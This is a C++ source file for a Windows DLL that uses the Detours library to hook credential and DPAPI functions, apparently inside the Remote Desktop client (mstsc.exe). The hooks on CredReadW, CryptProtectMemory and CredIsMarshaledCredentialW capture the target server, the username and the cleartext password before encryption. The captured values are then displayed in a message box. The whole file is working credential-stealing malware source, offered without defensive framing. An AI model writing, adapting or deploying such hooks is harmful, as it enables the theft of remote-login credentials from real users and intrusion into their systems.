// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include<windows.h>
#include<dpapi.h>
#include<wincred.h>
#include<stdio.h>
#include<strsafe.h>
#include "detours.h"
#pragma comment(lib,"detours.lib")
#pragma comment(lib, "crypt32.lib")

LPCWSTR lpServer = NULL;
LPCWSTR lpUsername = NULL;
LPCWSTR lpTempPassword = NULL;

//original signatures
typedef DPAPI_IMP  BOOL(WINAPI* OriginalCryptProtectMemory1)(LPVOID pDataIn, DWORD  cbDataIn, DWORD  dwFlags);

static BOOL(WINAPI* OriginalCredIsMarshaledCredentialW)(LPCWSTR MarshaledCredential) = CredIsMarshaledCredentialW;
static BOOL(WINAPI* OriginalCredReadW)(LPCWSTR targetName, DWORD type, DWORD flags, PCREDENTIALW *credential) = CredReadW;

//Load Library Dynamically by MSTSC.exe
static OriginalCryptProtectMemory1  OriginalCryptProtectMemory = (OriginalCryptProtectMemory1)GetProcAddress(GetModuleHandleW(L"crypt32.dll"), "CryptProtectMemory");


DWORD WINAPI CreateMessageBox(LPCWSTR lpParam) {
    MessageBox(NULL, lpParam, L"Dll says:", MB_OK);
    return 0;
}

VOID displayCredentials() {
    const DWORD cbBuffer = 1024;
    WCHAR  DataBuffer[cbBuffer];
    memset(DataBuffer, 0x00, cbBuffer);
    StringCbPrintf(DataBuffer, cbBuffer, L"Server: %s Username: %s Password: %s", lpServer, lpUsername, lpTempPassword);
    CreateMessageBox(DataBuffer);
}

BOOL  _CredReadW(LPCWSTR targetName, DWORD type, DWORD flags, PCREDENTIALW* credential) {
    lpServer = targetName;
    return OriginalCredReadW(targetName, type, flags, credential);
}

BOOL _CryptProtectMemory(LPVOID pDataIn, DWORD  cbDataIn, DWORD  dwFlags) {

    DWORD cbPass = 0;
    LPVOID lpPassword;
    int* ptr = (int*)pDataIn;
    LPVOID lpPasswordAddress = ptr + 0x1;
    memcpy_s(&cbPass, 4, pDataIn, 4);

    //When the password is empty it only counts the NULL byte.
    if (cbPass > 0x2) {
        SIZE_T written = 0;
        lpPassword = VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);
        WriteProcessMemory(GetCurrentProcess(), lpPassword, lpPasswordAddress, cbPass, &written);
        lpTempPassword = (LPCWSTR)lpPassword;
    }

    return OriginalCryptProtectMemory(pDataIn, cbDataIn, dwFlags);
}

BOOL  _CredIsMarshaledCredentialW(LPCWSTR MarshaledCredential) {

    lpUsername = MarshaledCredential;

    displayCredentials();

    return OriginalCredIsMarshaledCredentialW(MarshaledCredential);
}

void attachDetour() {

    DetourRestoreAfterWith();
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    DetourAttach((PVOID*)&OriginalCryptProtectMemory, _CryptProtectMemory);
    DetourAttach((PVOID*)&OriginalCredIsMarshaledCredentialW, _CredIsMarshaledCredentialW);
    DetourAttach((PVOID*)&OriginalCredReadW, _CredReadW);

    DetourTransactionCommit();
}

void deAttachDetour() {

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    DetourDetach(&(PVOID&)OriginalCryptProtectMemory, _CryptProtectMemory);
    DetourDetach(&(PVOID&)OriginalCredIsMarshaledCredentialW, _CredIsMarshaledCredentialW);
    DetourDetach(&(PVOID&)OriginalCredReadW, _CredReadW);

    DetourTransactionCommit();
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    if (DetourIsHelperProcess()) {
        return TRUE;
    }

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH: 
        attachDetour();
        break;
    case DLL_THREAD_ATTACH:
       
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        deAttachDetour();
        break;
    }
    return TRUE;
}

